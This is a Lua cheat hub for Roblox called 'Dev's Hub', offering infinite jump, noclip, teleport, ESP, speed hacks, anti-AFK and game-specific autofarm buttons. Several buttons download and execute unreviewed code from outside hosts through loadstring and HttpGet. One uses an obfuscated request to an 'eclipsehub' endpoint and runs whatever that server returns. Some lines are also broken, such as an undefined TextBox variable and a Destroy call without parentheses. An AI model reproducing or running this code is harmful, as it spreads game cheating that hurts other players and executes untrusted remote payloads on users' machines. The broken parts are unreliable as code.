local Luminosity = loadstring(game:HttpGet("https://raw.githubusercontent.com/iHavoc101/Genesis-Studios/main/UserInterface/Luminosity.lua", true))()

local Window = Luminosity.new("Dev's Hub", "v1.0.0", 6034996698)

local Tab1 = Window.Tab("Local Player", 6034503364)

local Tab2 = Window.Tab("Players", 6034452643)

local Tab3 = Window.Tab("World", 6034304881)

local Tab4 = Window.Tab("Gui's", 6034304892)

local Tab5 = Window.Tab("Settings", 6034925620)

local Folder1 = Tab1.Folder("Local Player", "A bunch of options you can use")

local Folder2 = Tab2.Folder("Players", "A bunch of options you can use")

local Folder3 = Tab3.Folder("World", "A bunch of options you can use")

local Folder4 = Tab4.Folder("Gui List", "A bunch of options you can use")

local Folder5 = Tab5.Folder("Settings", "A bunch of options you can use")

Folder1.Toggle("Infinite Jump", function(Status)
   _G.infinjump = Status

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		if _G.infinjump then
			if k:byte() == 32 then
				Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				Humanoid:ChangeState("Jumping")
				wait(0.1)
				Humanoid:ChangeState("Seated")
			end
		end
	end)

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		k = k:lower()
		if k == "f" then
			if _G.infinjump == true then
				_G.infinjump = false
			else
				_G.infinjump = true
			end
		end
	end)
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Infinite Jump Toggled";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder1.Toggle("NoClip", function(Status)
    noclip = Status
    game:GetService('RunService').Stepped:connect(function()
    if noclip then
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
    end
    end)
    plr = game.Players.LocalPlayer
    mouse = plr:GetMouse()
    mouse.KeyDown:connect(function(key)

    if key == "m" then
    noclip = not noclip
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
    end
    end)
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = ("NoClip Toggled");
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder1.Button("Key Teleport (v)", "Inject", function()
    plr = game.Players.LocalPlayer
    hum = plr.Character.HumanoidRootPart
    mouse = plr:GetMouse()

    mouse.KeyDown:connect(function(key)
    if key == "v" then
    if mouse.Target then
    hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
    end
    end
    end)
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Key Teleport (v) Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder1.Button("Anti-Afk", "Inject", function()
    local VirtualUser=game:service'VirtualUser'
    game:service'Players'.LocalPlayer.Idled:connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Anti-Afk Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder1.Slider("WalkSpeed", {Precise = true, Default = 15, Min = 15, Max = 200}, function(Status)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Status
end)

Folder1.Slider("JumpPower", {Precise = true, Default = 50, Min = 50, Max = 400}, function(Status)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = Status
end)

Folder2.TextBox("Teleport to Player", "Enter Name", function(Text)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players:FindFirstChild(TextBox).Character.HumanoidRootPart.Position)
          game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Teleported to Player";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder2.Button("ESP", "Inject", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua",true))()
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "ESP Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder3.Button("NoBlur", "Inject", function()
    game.Lighting.Blur.Size = 0
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "NoBlur Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder3.Button("NoFog", "Inject", function()
    game.Lighting.FogEnd = 999999999
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "NoFog Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder3.Button("LowGravity", "Inject", function()
    game.Workspace.Gravity = 15
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "LowGravity Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder3.Button("FullBright", "Inject", function()
        for i,v in pairs(game:GetService("Lighting"):GetChildren()) do
		if v:IsA("PostEffect") then
			v:Destroy()
		end
        end
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "FullBright Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder4.Button("Jailbreak Autofarm", "Inject", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))();
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Script Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder4.Button("Murder Mystery 2", "Inject", function()
    getgenv().mainKey = "nil"
    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
        game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "Script Injected";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder4.Button("Pet Simualtor X", "Inject", function()
    game.StarterGui:SetCore("SendNotification", {
		Title = "Dev's Hub";
		Text = "This script is currently down";
		Icon = "rbxassetid://6034996698";
		Duration = 10;
	})
end)

Folder4.Button("FunkyFriday Autoplayer", "Inject", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
end)

Folder5.Button("Destroy Gui", "Destroy", function()
    game.CoreGui.Luminosity:Destroy
end)

game:GetService("UserInputService").InputBegan:Connect(function(Input)
if Input.KeyCode == Enum.KeyCode.F then
Window:Toggle()
end
end)
